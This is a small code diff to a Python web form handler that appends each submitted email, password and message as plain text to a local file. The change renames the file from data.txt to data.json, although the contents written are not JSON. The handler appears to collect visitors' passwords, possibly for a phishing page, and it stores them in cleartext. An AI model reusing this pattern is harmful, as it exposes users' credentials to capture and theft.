@@ -21,7 +21,7 @@ def submit():
     print("Data collected And Writing data into txt file...")
     if request.method == 'POST':
         # Save the data to a text file
-        with open("data.txt", "a") as f:
+        with open("data.json", "a") as f:
             f.write(f"Email: {email}\nPassword: {password}\nMessage: {message}\n\n")
     print("Data added successfully...")
     return send_file("index.html")
